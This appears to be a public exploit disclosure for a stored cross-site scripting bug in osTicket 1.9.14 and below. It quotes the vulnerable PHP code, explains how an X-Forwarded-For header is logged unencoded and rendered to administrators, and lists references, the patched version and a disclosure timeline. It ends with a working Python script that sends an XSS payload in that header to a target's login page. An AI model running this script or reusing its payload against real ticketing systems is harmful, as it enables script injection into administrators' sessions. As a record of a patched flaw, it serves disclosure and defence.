@@ -1,0 +1,168 @@
+# Exploit Title: Osticket 1.9.14 and below (X-Forwarded-For) Stored XSS.
+# Date: 24-11-2016
+# Exploit Author: Joaquin Ramirez Martinez [ i0-SEC ]
+# Software Link: http://osticket.com/
+# Vendor: Osticket
+
+"""
+==============
+ DESCRIPTION
+==============
+
+**osTicket** is a widely-used open source support ticket system. It seamlessly
+integrates inquiries created via email, phone and web-based forms into a
+simple easy-to-use multi-user web interface. Manage, organize and archive
+all your support requests and responses in one place while providing your
+customers with accountability and responsiveness they deserve.
+
+(copy of Osticket - README.md)
+
+=======================
+ VULNERABILITY DETAILS
+=======================
+
+file `osticket/upload/bootstrap.php` contains this 
+snippet of code (line 337-340):
+
+  ...
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+    // Take the left-most item for X-Forwarded-For
+    $_SERVER['REMOTE_ADDR'] = trim(array_pop(
+        explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));
+
+   ....
+
+The $_SERVER['REMOTE_ADDR'] value gets overrided with the `X-Forwarded-For` header value,
+at this point, it is not a vulnerability but...
+file `osticket/upload/include/class.osticket.php` line 309-315 :
+
+  ...
+
+//Save log based on system log level settings.
+        $sql='INSERT INTO '.SYSLOG_TABLE.' SET created=NOW(), updated=NOW() '
+            .',title='.db_input(Format::sanitize($title, true))
+            .',log_type='.db_input($loglevel[$level])
+            .',log='.db_input(Format::sanitize($message, false))
+            .',ip_address='.db_input($_SERVER['REMOTE_ADDR']);
+
+        db_query($sql, false);
+
+    ....
+
+
+Everytime when a csrf attack is dettected (checking `X_CSRFTOKEN` header or the post parameter `__CSRFToken__`), 
+Osticket saves into database the user controled value $_SERVER['REMOTE_ADDR'] even if it has an invalid format.
+
+Finally the XSS is triggered when a user who can see the system logs like an administrator, visits
+the /scp/logs.php URI. It happens because osticket does not encode the output of the data stored into the database.
+
+The code responsible for lanching the XSS is located in `osticket/upload/include/staff/syslogs.inc-php`
+line 142...
+
+...
+<td><?php echo $row['ip_address']; ?></td>
+...
+
+So...
+
+An attacker can make an HTTP request with a header `X-Forwarded-For` containing the XSS payload 
+with an invalid CSRF token to the login interface waiting for an administrator to view the logs and trigger the XSS.
+
+
+================
+  DEMONSTRATION
+================
+
+Demo video: https://www.youtube.com/watch?v=lx_WlL89F70
+
+The demo also show a low severity XSS vulnerability in the helpdesk name/title of osticket.
+
+
+================
+  REFERENCES
+================
+
+https://github.com/osTicket/osTicket/releases
+https://github.com/osTicket/osTicket/releases/tag/v1.9.15
+
+X-Forwarded-For XSS:
+
+https://github.com/osTicket/osTicket/pull/3439
+https://github.com/osTicket/osTicket/commit/4396f91cdc990b7da598a7562eb634b89314b631
+
+heldeskt name/tile XSS:
+
+https://github.com/osTicket/osTicket/pull/3439
+https://github.com/osTicket/osTicket/commit/2fb47bd84d1905b49beab05fcf3f01b00a171c37
+
+================
+  MITIGATIONS
+================
+
+update to version 1.9.15 or later
+
+================
+  CREDITS
+================
+
+Vulnerability discovered by Joaquin Ramirez Martinez
+  
+  https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q/videos
+  https://twitter.com/rammarj
+
+================
+  TIMELINE
+================
+
+13-07-2016 - Vulnerability found
+19-09-2016 - Osticket knew the flaws
+01-11-2016 - Osticket patches vulnerabilities (v1.9.15 released)
+24-11-2016 - Public disclosure.
+
+
+"""
+import urllib
+import urllib2
+from optparse import OptionParser
+
+options = OptionParser(usage='python %prog [options]', description='Stored XSS')
+options.add_option('-t', '--target', type='string', default='http://localhost', help='(required) example: http://localhost')
+options.add_option('-p', '--path', type='string', default='/', help='osticket path. Default: /')
+options.add_option('-x', '--payload', type='string', default='<svg/onload=alert(/Osticket_XSSed_by_i0-sec/)>'
+  , help='xss payload. Default: "<svg/onload=alert(/Osticket_XSSed_by_i0-sec/)>"')
+
+banner = """ 
+
+======================================================   
+                       OSTICKET 
+  "The most popular ticketing system in the world"
+                      Stored XSS
+
+            by i0-sec (Joaquin R. M.)
+======================================================
+
+"""
+
+def main():
+    opts,args = options.parse_args()    
+    print(banner)
+    server = opts.target
+    path = opts.path
+    body = urllib.urlencode({"__CSRFToken__":"invalid", "do":"scplogin", "userid":"invalid", "passwd":"invalid", "submit":""})    
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
+    "Content-type": "application/x-www-form-urlencoded", "X-Forwarded-For": opts.payload}
+    url = server+path+"/scp/login.php" #default login interface URI for OSTICKET
+    print('[+] Connecting to '+server+path)
+    req = urllib2.Request(url, body, headers)
+    try:
+      print('[+] Sending payload... ')
+      response = urllib2.urlopen(req)
+      html = response.read()
+    except Exception, e:
+      pass
+    print '[+] Payload sent.'
+    print '[+] Completed.\n'
+
+if __name__ == '__main__':
+    main()
